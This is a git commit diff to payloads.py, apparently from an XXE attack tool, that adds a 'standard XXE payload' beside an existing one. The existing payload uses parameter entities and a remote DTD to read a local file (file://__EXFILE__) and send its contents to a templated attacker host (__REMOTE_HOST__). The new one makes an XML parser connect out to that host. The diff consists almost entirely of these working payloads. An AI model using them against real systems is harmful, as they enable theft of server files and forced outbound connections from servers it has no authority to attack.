0c1075bdb2827ba9f3423320b2d0a6137c17baa2
root <root@d2d012c1e7a1>
2019-08-21 22:26:14 +0100

    Added simple payload

--- payloads.py
+++ payloads.py
@@ -3,5 +3,10 @@ payloads = {
         "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
         "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://__EXFILE__"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "__PROTOCOL__://__REMOTE_HOST__">%dtd;]>',
         "entity": "&xxe;",
+    },
+    "std":{ 
+        "description": "A standard XXE payload",
+        "payload":"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"__PROTOCOL__://__REMOTE_HOST__\"> ]>",
+        "entity":"&xxe;",
     }
 }
